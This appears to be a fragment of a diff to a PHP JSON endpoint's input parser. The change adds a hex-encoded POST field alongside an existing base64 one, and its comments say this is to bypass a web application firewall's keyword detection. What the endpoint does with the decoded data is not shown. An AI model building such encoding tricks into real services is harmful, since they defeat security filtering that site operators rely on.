@@ -5,11 +5,19 @@
 header('Content-Type: application/json');
 error_reporting(0);
 
-// ---- Parse input - handles base64 'data' field (WAF bypass) and plain $_POST ----
+// ---- Parse input - handles hex 'd' field (WAF bypass) and plain $_POST ----
 function parseInput() {
-    // If sender encoded payload as base64 in 'data' field
+    // Hex-encoded JSON payload in 'd' field (avoids WAF keyword detection)
+    if (!empty($_POST['d'])) {
+        $decoded = @hex2bin($_POST['d']);
+        if ($decoded) {
+            $json = @json_decode($decoded, true);
+            if (is_array($json)) return $json;
+        }
+    }
+    // Base64 fallback
     if (!empty($_POST['data'])) {
-        $decoded = @base64_decode($_POST['data']);
+        $decoded = @base64_decode(str_replace(' ', '+', $_POST['data']));
         if ($decoded) {
             $json = @json_decode($decoded, true);
             if (is_array($json)) return $json;
